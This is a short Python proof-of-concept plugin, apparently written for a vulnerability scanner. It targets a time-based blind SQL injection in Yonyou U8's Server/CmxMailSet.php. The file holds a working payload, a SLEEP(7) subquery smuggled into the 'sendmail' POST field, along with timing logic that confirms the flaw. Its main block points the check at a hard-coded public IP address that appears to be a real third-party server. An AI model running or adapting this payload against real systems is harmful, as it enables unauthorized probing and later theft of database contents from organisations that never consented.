#/usr/bin/python
#-*- coding: utf-8 -*-


"""

POC Name  : 用友u8 CmxMailSet.php sql注入
Author    :  a
mail      :  a@lcx.cc
Refer     : http://www.wooyun.org/bugs/wooyun-2015-156891


"""

import re
import time

def assign(service, arg):
    if service == "yongyou_u8":
        return True, arg    

def audit(arg):
    url = arg + "Server/CmxMailSet.php"
    data_poc = "sendmail=test' AND (SELECT * FROM (SELECT(SLEEP(7)))MDqI) AND 'geIm'='geIm&username=test"
    data = "sendmail=test&username=test"
    time1 = time.time()
    code1, head, res, errcode, _ = curl.curl2(url, data)
    time2 = time.time()
    true_time=time2-time1
    time3 = time.time()
    code2, head, res, errcode, _ = curl.curl2(url, data_poc)
    time4 = time.time()
    false_time =time4-time3
    if code1==302 and code2==302 and false_time-true_time > 6:
        security_hole(url + '  sql injection!')
            
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_u8', 'http://221.224.116.210:81/')[1])